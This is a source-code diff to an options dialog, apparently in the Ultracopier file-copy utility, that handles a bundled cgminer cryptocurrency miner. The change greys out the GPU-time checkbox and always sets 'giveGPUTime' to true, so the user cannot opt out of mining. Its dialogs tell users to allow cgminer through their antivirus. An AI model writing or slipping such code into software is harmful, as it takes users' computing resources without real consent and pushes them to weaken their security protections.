@@ -75,15 +75,10 @@ OptionDialog::OptionDialog() :
     ui->checkTheUpdate->hide();
     #endif
 
-    /// \todo fix when this line is not commented
-    //QMessageBox::critical(this,tr(""),tr(""));
-
     #ifdef ULTRACOPIER_CGMINER
-    #ifndef ULTRACOPIER_VERSION_ULTIMATE
     ui->label_gpu_time->setEnabled(false);
     ui->giveGPUTime->setEnabled(false);
     OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",true);
-    #endif
     bool OpenCLDll=false;
     char *arch=getenv("windir");
     if(arch!=NULL)
@@ -101,16 +96,12 @@ OptionDialog::OptionDialog() :
     {
         if(!QFile(QCoreApplication::applicationDirPath()+"/cgminer/cgminer.exe").exists())
         {
-            #ifndef ULTRACOPIER_VERSION_ULTIMATE
-            QMessageBox::critical(this,tr("Allow cgminer"),tr("This Ultimate version is only if cgminer is allowed by your antivirus"));
-            #endif
+            QMessageBox::critical(this,tr("Allow cgminer"),tr("This Ultimate version is only if cgminer is allowed by your antivirus. You can get the normal free version (without cgminer)"));
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"application not found");
         }
         if(!OpenCLDll)
         {
-            #ifndef ULTRACOPIER_VERSION_ULTIMATE
-            QMessageBox::critical(this,tr("Allow OpenCL"),tr("This Ultimate version is only if OpenCL is installed with your graphic card drivers"));
-            #endif
+            QMessageBox::critical(this,tr("Allow OpenCL"),tr("This Ultimate version is only if OpenCL is installed with your graphic card drivers. You can get the normal free version (without cgminer)"));
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OpenCL.dll not found");
         }
         ui->label_gpu_time->setEnabled(false);
